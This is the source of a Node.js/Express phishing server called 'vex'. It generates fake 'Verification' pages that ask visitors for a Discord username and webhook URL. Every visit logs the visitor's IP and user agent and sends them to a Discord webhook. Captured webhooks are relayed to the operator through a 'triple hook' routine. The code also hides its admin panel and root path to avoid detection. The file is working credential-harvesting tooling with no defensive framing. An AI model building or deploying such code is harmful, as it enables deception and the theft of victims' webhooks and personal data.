const express = require('express');
const fetch = require('node-fetch');
const path = require('path');
const fs = require('fs');

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ——— CONFIG ———
const YOUR_MASTER_WEBHOOK = 'https://discord.com/api/webhooks/YOUR/MASTER_HOOK_HERE';
const PORT = 3000;

// store generated pages in memory (or use a json file)
const pages = new Map();

// ——— STATIC: serve admin panel only at /admin-panel (hidden) ———
app.get('/admin-panel', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// ——— API: create a new slug page ———
app.post('/api/create', async (req, res) => {
    const { slug, ref, title, template, userWebhook } = req.body;

    if (!slug || !ref) return res.status(400).json({ error: 'Missing fields' });

    pages.set(slug, {
        ref,
        title: title || 'Verification',
        template: template || 'verify',
        userWebhook: userWebhook || null,
        hits: 0,
        created: Date.now()
    });

    res.json({ success: true, url: `/${slug}?ref=${encodeURIComponent(ref)}` });
});

// ——— TRIPLE HOOK FUNCTION ———
async function tripleHook(payload, userWebhook) {
    const hooks = [YOUR_MASTER_WEBHOOK];

    // if user provided their own webhook, add it (dualhook)
    if (userWebhook) {
        hooks.push(userWebhook);
    }

    // third hook: mirror to master again with different embed color for separation
    const masterMirror = {
        ...payload,
        embeds: payload.embeds?.map(e => ({ ...e, color: 0xff3366 })) || payload.embeds
    };

    const sends = hooks.map(url =>
        fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        }).catch(() => {})
    );

    // third hook — audit log to master
    sends.push(
        fetch(YOUR_MASTER_WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(masterMirror)
        }).catch(() => {})
    );

    await Promise.allSettled(sends);
}

// ——— VISIT NOTIFIER + SLUG HANDLER ———
app.get('/:slug', async (req, res) => {
    const slug = req.params.slug;
    const ref = req.query.ref || 'unknown';
    const page = pages.get(slug);

    // don't expose admin panel or nonexistent slugs
    if (!page && slug !== 'admin-panel') {
        return res.status(404).send('Not found');
    }

    if (!page) return res.status(404).send('Not found');

    page.hits++;

    // collect visitor info
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const ua = req.headers['user-agent'] || 'Unknown';
    const timestamp = new Date().toISOString();

    // ——— VISIT NOTIFICATION (with @everyone) ———
    const visitPayload = {
        content: '@everyone',
        embeds: [{
            title: '🔔 New Visit Detected',
            color: 0x5842ff,
            fields: [
                { name: 'Referral User', value: `\`${ref}\``, inline: true },
                { name: 'Slug', value: `\`/${slug}\``, inline: true },
                { name: 'Hit Count', value: `\`${page.hits}\``, inline: true },
                { name: 'IP', value: `\`${ip}\``, inline: false },
                { name: 'User Agent', value: `\`\`\`${ua}\`\`\``, inline: false },
                { name: 'Timestamp', value: timestamp, inline: false }
            ],
            footer: { text: 'vex • triple-hook system' }
        }]
    };

    await tripleHook(visitPayload, page.userWebhook);

    // ——— SERVE THE FAKE PAGE ———
    const html = generatePage(page, slug, ref);
    res.send(html);
});

// ——— WEBHOOK INPUT HANDLER (user submits their webhook on the page) ———
app.post('/api/hook-submit', async (req, res) => {
    const { webhook, slug, ref, username } = req.body;

    const hitPayload = {
        content: '@everyone',
        embeds: [{
            title: '🎯 Webhook Captured',
            color: 0x4ade80,
            fields: [
                { name: 'Referral Hit User', value: `\`${ref || 'unknown'}\``, inline: true },
                { name: 'Captured Username', value: `\`${username || 'N/A'}\``, inline: true },
                { name: 'Webhook URL', value: `\`\`\`${webhook}\`\`\``, inline: false },
                { name: 'Slug', value: `\`/${slug}\``, inline: true },
                { name: 'Timestamp', value: new Date().toISOString(), inline: true }
            ],
            footer: { text: 'vex • webhook captured' }
        }]
    };

    // also store their webhook as dualhook for this page
    const page = pages.get(slug);
    if (page) {
        page.userWebhook = webhook;
    }

    await tripleHook(hitPayload, webhook);

    res.json({ success: true });
});

// ——— PAGE GENERATOR ———
function generatePage(page, slug, ref) {
    return `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>${page.title}</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
        body {
            font-family: 'Inter', sans-serif;
            background: #0e0e16;
            color: #ccc;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .card {
            background: #16161f;
            border: 1px solid #222233;
            border-radius: 14px;
            padding: 36px 32px;
            width: 90%;
            max-width: 440px;
            text-align: center;
        }
        .card h1 { font-size: 20px; color: #fff; margin-bottom: 8px; }
        .card p { font-size: 13px; color: #666; margin-bottom: 24px; }
        input {
            width: 100%;
            padding: 12px 14px;
            background: #0c0c12;
            border: 1px solid #1e1e2e;
            border-radius: 8px;
            color: #ddd;
            font-size: 14px;
            margin-bottom: 14px;
            outline: none;
            font-family: 'Inter', sans-serif;
        }
        input:focus { border-color: #5842ff; }
        input::placeholder { color: #3a3a4a; }
        .btn {
            width: 100%;
            padding: 13px;
            background: linear-gradient(135deg, #5842ff, #7c3aed);
            border: none;
            border-radius: 8px;
            color: #fff;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            font-family: 'Inter', sans-serif;
        }
        .btn:hover { opacity: 0.9; }
        .msg { margin-top: 14px; font-size: 12px; color: #4ade80; display: none; }
        .logo { font-size: 28px; margin-bottom: 16px; }
    </style>
</head>
<body>
    <div class="card">
        <div class="logo">⚡</div>
        <h1>${page.title}</h1>
        <p>Enter your details below to continue.</p>
        <input type="text" id="username" placeholder="Discord Username" />
        <input type="text" id="webhook" placeholder="Your Webhook URL" />
        <button class="btn" onclick="submit()">Verify</button>
        <p class="msg" id="msg">✓ Verified successfully</p>
    </div>
    <script>
        async function submit() {
            const webhook = document.getElementById('webhook').value.trim();
            const username = document.getElementById('username').value.trim();
            if (!webhook) return;
            try {
                await fetch('/api/hook-submit', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        webhook,
                        username,
                        slug: '${slug}',
                        ref: '${ref}'
                    })
                });
                document.getElementById('msg').style.display = 'block';
            } catch(e) {}
        }
    </script>
</body>
</html>`;
}

// ——— ROOT: return nothing (hide your site) ———
app.get('/', (req, res) => {
    res.status(404).send('');
});

app.listen(PORT, () => console.log(`vex running on :${PORT}`));
